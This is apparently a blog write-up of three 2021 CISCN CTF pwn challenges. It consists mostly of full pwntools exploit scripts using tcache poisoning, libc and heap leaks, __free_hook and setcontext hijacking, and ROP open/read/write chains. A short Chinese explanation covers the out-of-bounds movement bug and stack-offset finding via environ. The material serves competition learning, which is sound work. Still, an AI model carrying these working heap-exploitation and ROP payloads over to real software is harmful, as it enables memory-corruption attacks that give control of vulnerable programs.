---
title: 2021ciscn pwn
date: 2021-07-15 00:00:07
categories:
  - pwn
---

## lonelywolf
### 附件
[attachment](/attachment/lonelywolf.zip)
### exp
```python
#!/usr/bin/env python 
from pwn import *

context.log_level = "debug"
p = process("./lonelywolf")
elf = ELF("./lonelywolf")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def malloc(size):
	p.recvuntil("choice: ")
	p.sendline("1")
	p.recvuntil("Index: ")
	p.sendline("0")
	p.recvuntil("Size: ")
	p.sendline(str(size))
def edit(content):
	p.recvuntil("choice: ")
	p.sendline("2")
	p.recvuntil("Index: ")
	p.sendline("0")
	p.recvuntil("Content: ")
	p.sendline(content)
def show():
	p.recvuntil("choice: ")
	p.sendline("3")
	p.recvuntil("Index: ")
	p.sendline("0")
	p.recvuntil("Content: ")
	return p.recvuntil("\n")
def delete():
	p.recvuntil("choice: ")
	p.sendline("4")
	p.recvuntil("Index: ")
	p.sendline("0")

malloc(0x78)
delete()
payload = ""
payload += "A"*8
payload += "\x00"
edit(payload)
delete()
pnt1 = u64(show()[:-1].ljust(8,"\x00"))
edit(p64(pnt1-0x250))
malloc(0x78)
malloc(0x78)
payload = ""
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += "\x00\x00\x00\x07\x00\x00\x00\x00"
edit(payload)
delete()
pnt2 = u64(show()[:-1].ljust(8,"\x00"))
free_hook = 0x7fc0222808e8-0x7fc02227eca0+pnt2
libc.address = free_hook - libc.sym["__free_hook"]
payload = ""
payload += "\x00\x00\x00\x00\x00\x00\x01\x00"
payload += "\x00"*0x68
payload += p64(free_hook)
edit(payload)
malloc(0x78)
# delete()
# edit(p64(free_hook))
# malloc(0x78)
system = libc.sym["system"]
edit(p64(libc.address+0x10a41c ))
print("main_area+88 => 0x%x"%pnt2)
delete()

p.interactive()

```
## sliverwolf
### 附件
[attachment](/attachment/silverwolf.zip)
### exp
```python
#!/usr/bin/env python 
from pwn import *

# context.log_level = "debug"
p    = process("./silverwolf",env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("./libc-2.27.so")

def clean():
	for _ in range(7):
		malloc(0x78)
	for _ in range(11):
		malloc(0x68)
	for _ in range(12):
		malloc(0x8)
	for _ in range(1):
		malloc(0x58)
	for _ in range(3):
		malloc(0x78)
def myTcache(tcache):
	id = ""
	ptr = ""
	tcache_id = tcache.keys()
	for i in range(2,66):
		if i*0x10 in tcache_id:
			id  += chr(tcache[i*0x10][0])
			ptr += p64(tcache[i*0x10][1])
		else:
			id  += chr(0)
			ptr += p64(0)
	return id+ptr
def malloc(size):
	p.recvuntil("choice: ")
	p.sendline("1")
	p.recvuntil("Index: ")
	p.sendline("0")
	p.recvuntil("Size: ")
	p.sendline(str(size))
def edit(content):
	p.recvuntil("choice: ")
	p.sendline("2")
	p.recvuntil("Index: ")
	p.sendline("0")
	p.recvuntil("Content: ")
	p.sendline(content)
def show():
	p.recvuntil("choice: ")
	p.sendline("3")
	p.recvuntil("Index: ")
	p.sendline("0")
	p.recvuntil("Content: ")
	return p.recvuntil("\n")
def delete():
	p.recvuntil("choice: ")
	p.sendline("4")
	p.recvuntil("Index: ")
	p.sendline("0")
def exp():
	clean()

	## to get a heap pointer
	malloc(0x78)
	delete()
	edit("\x00"*16)
	delete()
	pnt1 = u64(show()[:-1].ljust(8,"\x00"))
	tcache = pnt1 - 0x1a50
	vic    = pnt1 - 0x100
	print("pnt1   => 0x%x"%pnt1)
	print("tcache => 0x%x"%tcache)

	## to edit the tcache_chunk
	edit(p64(tcache))
	malloc(0x78)
	malloc(0x78)
	tcacheChunk = {
	0x70   : [1,vic-0x20],
	0x80   : [1,vic],
	0xd0   : [3,0],
	0xf0   : [2,0],
	0x100  : [7,0]
	}
	edit(myTcache(tcacheChunk)[0:0x78])

	## make a fake chunk then free 
	## to get libc address
	malloc(0x68)
	payload = ""
	payload += p64(0)
	payload += p64(0)
	payload += p64(0)
	payload += p64(0x101)
	edit(payload)
	malloc(0x78)
	delete()
	malloc_hook = u64(show()[:-1].ljust(8,"\x00")) - 0x70
	libc.address = malloc_hook - libc.sym["__malloc_hook"]
	print("__free_hook => 0x%x"%libc.sym["__free_hook"])

	#### gadget pointer
	pop_rdi = 0x00000000000215bf+libc.address
	pop_rsi = 0x0000000000023eea+libc.address
	pop_rdx = 0x0000000000001b96+libc.address
	pop_rax = 0x0000000000043ae8+libc.address
	syscall = 0x00000000000d2745+libc.address
	####

	### to make rop and orw
	malloc(0x58)
	delete()
	edit(p64(libc.sym["__free_hook"])+p64(0))
	setcotext_53 = libc.address + 0x00000000000521b5
	malloc(0x78)
	delete()
	# This ptr tcache + 0x19b0
	payload = ""
	payload += p64(tcache+0x19b0-0x90)
	payload += p64(0)
	payload += p64(tcache+0x19b0+0x20)
	payload += p64(pop_rsi)
	payload += p64(0)
	payload += p64(pop_rdx)
	payload += p64(7)
	payload += p64(pop_rax)
	payload += p64(2)
	payload += p64(syscall)
	payload += p64(pop_rdi)
	payload += p64(3)
	payload += p64(pop_rsi)
	payload += p64(tcache+0x19b0-0x90)
	edit(payload)
	malloc(0x78)
	malloc(0x68)
	delete()
	edit(p64(tcache+0x1a20)+p64(0))
	malloc(0x68)
	malloc(0x68)
	payload = ""
	payload += p64(pop_rdx)
	payload += p64(0x80)
	payload += p64(pop_rax)
	payload += p64(0)
	payload += p64(syscall)
	payload += p64(pop_rdi)
	payload += p64(1)
	payload += p64(pop_rsi)
	payload += p64(tcache+0x19b0-0x90)
	payload += p64(pop_rax)
	payload += p64(1)
	payload += p64(syscall)
	edit(payload)
	
	### trigger
	malloc(0x58)
	malloc(0x58)
	edit(p64(setcotext_53)+p64(0))
	malloc(0x78)
	edit("/flag"+"\x00"*0x63+p64(tcache+0x19b0-0x90))
	delete()
	p.interactive()
if __name__ == '__main__':
	exp()
```


## game
### 附件
[attachment](/attachment/game.zip)
### exp
```python
#_*_coding:utf-8_*_
#!/usr/bin/env python
import re
from pwn import *

context(log_level='info',arch='amd64',os='linux')

p = process("./game")#,env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("./game").libc


def initMap(col,row):
	p.recvuntil("cmd> ")
	p.sendline("op:1\nl:{0}\nw:{1}\n".format(col,row))
def add(id,size,desc):
	p.recvuntil("cmd> ")
	p.sendline("op:2\nid:{0}\ns:{1}\n".format(id,size))
	p.recvuntil("desc> ")
	p.sendline(desc)

def add2(id,size,desc):
	p.recvuntil("cmd> ")
	p.sendline("op:2\nid:{0}\ns:{1}\n".format(id,size))
	p.recvuntil("desc> ")
	raw_input("在此断点 找上层函数的栈桢")
	p.sendline(desc)
def show():
	p.recvuntil("cmd> ")
	p.sendline("op:4\n")
def free(id):
	p.recvuntil("cmd> ")
	p.sendline("op:3\nid:{0}\n".format(id))
def down(id):
	p.recvuntil("cmd> ")
	p.sendline("op:5\nid:{0}\n".format(id))
def up(id):
	p.recvuntil("cmd> ")
	p.sendline("op:6\nid:{0}\n".format(id))
def left(id):
	p.recvuntil("cmd> ")
	p.sendline("op:7\nid:{0}\n".format(id))
def right(id):
	p.recvuntil("cmd> ")
	p.sendline("op:8\nid:{0}\n".format(id))
def getLibc():
	###
	add(1,0x410,"a")
	add(2,0x420,"a") # barrier
	free(1)
	add(1,0x410,"a"*7) # "a"*7+"\n"+"libc"
	show()
	malloc_hook = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))-96-0x10
	libc.address = malloc_hook - libc.sym["__malloc_hook"]
	print("malloc_hook 0x%x"%(malloc_hook))
	free(2)
	free(1)
def getCoor(id):
	pts = {}
	show()
	points = p.recvuntil("cmd> ",drop=True)
	regex = r"(\d{1,2}): (\((\d{1,2}),(\d{1,2})\))"
	points = re.findall(regex,points)
	for pin in points:
		pts[int(pin[0])] = (int(pin[2]),int(pin[3]))
	p.sendline("op:4\n")
	return pts[id]
def move(id,des):
	src = getCoor(id)
	if src[0] > des[0]:
		for _ in range(src[0]-des[0]):
			left(id)
	if src[0] < des[0]:
		for _ in range(des[0]-src[0]):
			right(id)
	if src[1] > des[1]:
		for _ in range(src[1]-des[1]):
			down(id)
	if src[1] < des[1]:
		for _ in range(des[1]-src[1]):
			up(id)


initMap(0x8,0x8)
getLibc()
for _ in range(7):
	add(0x11,0x28,"7777")
add(3,0x28  ,"3333") #below the map
add(4,0x3f8 ,"4444") 
add(5,0x28 ,"5555") #barrier
# free(3)
print(getCoor(3))
move(3,(1,9))
free(4)


free(3)
add(3,0x328,"A"*(0x10-1))
show()
p.recvuntil("A"*(0x10-1)+"\n")
heap = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))-0x1620
print("heap => 0x%x"%heap)

free(3)
payload = ""
payload += p64(0)*5
payload += p64(0x401)
payload += p64(libc.sym["environ"]-0x10)
payload += p64(0)
add(3,0x328,payload)


add(4,0x3f8 ,"4444") 
add(6,0x3f8 ,"6"*15)
show() 
p.recvuntil("6"*15+"\n")
environ = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))

free(3)
payload = ""
payload += p64(0)*5
payload += p64(0x3f1)
add(3,0x328,payload)

free(4)
free(3)
stack = environ-0x560
print("stack => 0x%x"%stack)
payload = ""
payload += p64(0)*5
payload += p64(0x3f1)
payload += p64(stack)
payload += p64(0)
add(3,0x328,payload)

###  local libc
pop_rax = 0x0000000000043ae8 + libc.address # : pop rax ; ret
pop_rdi = 0x00000000000215bf + libc.address # : pop rdi ; ret
pop_rsi = 0x0000000000023eea + libc.address # : pop rsi ; ret
pop_rdx = 0x0000000000001b96 + libc.address # : pop rdx ; ret
syscall = 0x00000000000D2745 + libc.address # : syscall ; ret 
###  additional libc
# pop_rdi = 0x000000000002155f + libc.address # : pop rdi ; ret
# pop_rsi = 0x0000000000023e8a + libc.address # : pop rsi ; ret
# pop_rdx = 0x0000000000001b96 + libc.address # : pop rdx ; ret
# pop_rax = 0x0000000000043a78 + libc.address # : pop rax ; ret
# syscall = 0x00000000000D29D5 + libc.address # : syscall ; ret
###

rop = ""
# open()
rop += p64(pop_rdi)
rop += p64(stack+0x8*23)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(7)
rop += p64(pop_rax)
rop += p64(0x2)
rop += p64(syscall)

# read()
rop += p64(pop_rdi)
rop += p64(3)
rop += p64(pop_rsi)
rop += p64(stack+0x100)
rop += p64(pop_rdx)
rop += p64(0x80)
rop += p64(pop_rax)
rop += p64(0)
rop += p64(syscall)

# write() rsi rdx 都不用变
rop += p64(pop_rdi)
rop += p64(1)
rop += p64(pop_rax)
rop += p64(1)
rop += p64(syscall)
rop += "./flag\x00"

add(7,0x3e8,"77777777")
add2(7,0x3e8,rop)

p.interactive()
```
### 说下思路
1. 静态动态分析，玩家之间使用单向链表链接，玩法就是驱动玩家在map中位移，我在附件中给了分析后的i64文件
2. 漏洞点在于玩家位移时没有控制边界
3. leak libc 申请一个大于0x408(tcache)的chunk，free掉进入unsorted bin，这个chunk的fd和bk都会填入mainarena的位置，再申请到此chunk 覆盖fd`"a"*7+"\n"` show的时候就可以把bk带出来
4. map的大小控制好，使之在堆的最下面
5. 申请到environ 在栈上布置rop orw
### environ的布局 触发 传参
* environ变量是在libc的空间，和__malloc_hook是一样的，environ变量处写入的是指向栈的一个指针,所以你需要一次show 把environ给show出来
* 怎么找偏移
  * 在进入一个函数内 也即`call callee`，会把下一条指令压入栈，以配合退出该函数时执行`ret`
  * 在callee的栈帧中，不会改变caller的栈帧数据,(不考虑特殊情况)，所以可以以caller压入的那条指令为首布置rop
  * 所以你需要在callee内部断点 找被压入栈的caller的下一条指令的位置，一般是在rbp下边第一个，该指令的栈指针 与 environ那个栈指针的偏移就行
* 传参
  * 把"./flag\x00" 放在rop后边，在open时，把stack+offset传给rdi
* 触发
  * 执行完callee 自然会执行rop



### exp2
```python
#_*_coding:utf-8_*_
#!/usr/bin/env python
import re
from pwn import *

context(log_level='info',arch='amd64',os='linux')

p = process("./game")#,env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("./game").libc


def initMap(col,row):
	p.recvuntil("cmd> ")
	p.sendline("op:1\nl:{0}\nw:{1}\n".format(col,row))
def add(id,size,desc):
	p.recvuntil("cmd> ")
	p.sendline("op:2\nid:{0}\ns:{1}\n".format(id,size))
	p.recvuntil("desc> ")
	p.sendline(desc)
def show():
	p.recvuntil("cmd> ")
	p.sendline("op:4\n")
def free(id):
	p.recvuntil("cmd> ")
	p.sendline("op:3\nid:{0}\n".format(id))
def down(id):
	p.recvuntil("cmd> ")
	p.sendline("op:5\nid:{0}\n".format(id))
def up(id):
	p.recvuntil("cmd> ")
	p.sendline("op:6\nid:{0}\n".format(id))
def left(id):
	p.recvuntil("cmd> ")
	p.sendline("op:7\nid:{0}\n".format(id))
def right(id):
	p.recvuntil("cmd> ")
	p.sendline("op:8\nid:{0}\n".format(id))
def getLibc():
	add(1,0x410,"a")
	add(2,0x420,"a") # barrier
	free(1)
	add(1,0x410,"a"*7) # "a"*7+"\n"+"libc"
	show()
	malloc_hook = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))-96-0x10
	libc.address = malloc_hook - libc.sym["__malloc_hook"]
	print("malloc_hook 0x%x"%(malloc_hook))
	free(2)
	free(1)
def getCoor(id):
	pts = {}
	show()
	points = p.recvuntil("cmd> ",drop=True)
	regex = r"(\d{1,2}): (\((\d{1,2}),(\d{1,2})\))"
	points = re.findall(regex,points)
	for pin in points:
		pts[int(pin[0])] = (int(pin[2]),int(pin[3]))
	p.sendline("op:4\n")
	return pts[id]
def move(id,des):
	src = getCoor(id)
	if src[0] > des[0]:
		for _ in range(src[0]-des[0]):
			left(id)
	if src[0] < des[0]:
		for _ in range(des[0]-src[0]):
			right(id)
	if src[1] > des[1]:
		for _ in range(src[1]-des[1]):
			down(id)
	if src[1] < des[1]:
		for _ in range(des[1]-src[1]):
			up(id)


initMap(0x8,0x8)
getLibc()
for _ in range(7):
	add(0x11,0x28,"7777")
add(3,0x28  ,"3333") #below the map
add(4,0x3f8 ,"4444") 
add(5,0x28 ,"5555") #barrier
# free(3)
print(getCoor(3))
move(3,(1,9))
free(4)

###  local libc
setcontext53 = 0x00000000000521b5+libc.address
pop_rax = 0x0000000000043ae8 + libc.address # : pop rax ; ret
pop_rdi = 0x00000000000215bf + libc.address # : pop rdi ; ret
pop_rsi = 0x0000000000023eea + libc.address # : pop rsi ; ret
pop_rdx = 0x0000000000001b96 + libc.address # : pop rdx ; ret
syscall = 0x00000000000D2745 + libc.address # : syscall ; ret 
###  additional libc
# setcontext53 = 0x0000000000052145+libc.address
# pop_rdi = 0x000000000002155f + libc.address # : pop rdi ; ret
# pop_rsi = 0x0000000000023e8a + libc.address # : pop rsi ; ret
# pop_rdx = 0x0000000000001b96 + libc.address # : pop rdx ; ret
# pop_rax = 0x0000000000043a78 + libc.address # : pop rax ; ret
# syscall = 0x00000000000D29D5 + libc.address # : syscall ; ret
###

free(3)
add(3,0x328,"A"*(0x10-1))
show()
p.recvuntil("A"*(0x10-1)+"\n")
heap = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))-0x1620
print("heap => 0x%x"%heap)

free(3)
payload = ""
payload += p64(0)*5
payload += p64(0x401)
payload += p64(libc.sym["__free_hook"])
payload += p64(0)
add(3,0x328,payload)


add(4,0x3f8 ,"4444") 
add(6,0x3f8 ,p64(setcontext53)+p64(0))



rop = ""
rop += "./flag\x00".ljust(8,"\x00")
rop += p64(0)*12
rop += p64(heap+0x2700)
rop += p64(0)*6
rop += p64(heap+0x27b0)
# open()
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(7)
rop += p64(pop_rax)
rop += p64(0x2)
rop += p64(syscall)

# read()
rop += p64(pop_rdi)
rop += p64(3)
rop += p64(pop_rsi)
rop += p64(heap+0x100)
rop += p64(pop_rdx)
rop += p64(0x80)
rop += p64(pop_rax)
rop += p64(0)
rop += p64(syscall)

# write() rsi rdx 都不用变
rop += p64(pop_rdi)
rop += p64(1)
rop += p64(pop_rax)
rop += p64(1)
rop += p64(syscall)
# print(hex(len(rop))) 0x150
add(7,0x500,rop)
free(7)
p.interactive()

```
* 布局
![](https://z3.ax1x.com/2021/07/18/W3gQ4P.jpg)













